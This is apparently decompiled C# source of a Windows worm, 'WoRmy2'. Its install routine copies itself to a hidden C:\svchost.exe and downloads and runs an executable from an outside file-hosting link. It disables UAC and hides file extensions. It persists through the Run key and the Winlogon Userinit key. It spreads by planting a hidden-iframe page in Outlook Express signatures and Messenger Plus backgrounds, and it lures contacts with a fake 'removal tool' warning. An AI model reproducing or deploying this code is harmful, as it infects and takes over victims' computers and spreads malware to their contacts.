using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WoRmy2.My;

namespace WoRmy2;

[StandardModule]
internal sealed class install
{
	public static string link = "http://tigerden.uppit.com/save/273fd1854f4ceead6cb052a868b3e0c6/4b690a6b/0209/ylljg8w7/Ass.exe";

	public static void inst()
	{
		try
		{
			File.Copy(Application.get_ExecutablePath(), "C:\\svchost.exe");
			File.SetAttributes("C:\\svchost.exe", FileAttributes.Hidden);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(link, Application.get_StartupPath() + "\\file.exe");
			File.SetAttributes(Application.get_StartupPath() + "\\file.exe", FileAttributes.Hidden);
			Process.Start(Application.get_StartupPath() + "\\file.exe");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			StreamWriter streamWriter = new StreamWriter("C:\\windows\\sp.htm");
			File.SetAttributes("C:\\WINDOWS\\sp.htm", FileAttributes.Normal);
			streamWriter.WriteLine("<iframe src=\"" + link + "\"height=0 width=0>");
			streamWriter.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.SetAttributes(Path.GetTempPath() + "desktop.ini", FileAttributes.Normal);
			StreamWriter streamWriter2 = new StreamWriter("desktop.ini");
			streamWriter2.WriteLine("[.ShellClassInfo]");
			streamWriter2.WriteLine("CLSID={F3AA0DC0-9CC8-11D0-A599-00C04FD64434}");
			streamWriter2.WriteLine("ConfirmFileOp = 0");
			streamWriter2.Close();
			File.SetAttributes(Path.GetTempPath() + "desktop.ini", FileAttributes.Hidden);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Microsoft", (object)"C:\\svchost.exe");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "Userinit", (object)"C:\\WINDOWS\\SYSTEM32\\Userinit.exe,C:\\svchost.exe");
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"2");
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object)"1");
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object)"0");
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Identities\\Software\\Microsoft\\Outlook Express\\5.0\\signatures", "Default Signature", (object)"C:\\windows\\sp.htm");
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Patchou\\Messenger Plus! Live\\GlobalSettings\\Scripts\\MSN PLUS", "background", (object)"C:\\windows\\sp.htm");
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\MessengerService\\Policies", "Warning", (object)("(M)Warning: The person(s) you are talking to are infected! Send them the removal tool that can be found at " + link));
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
	}
}
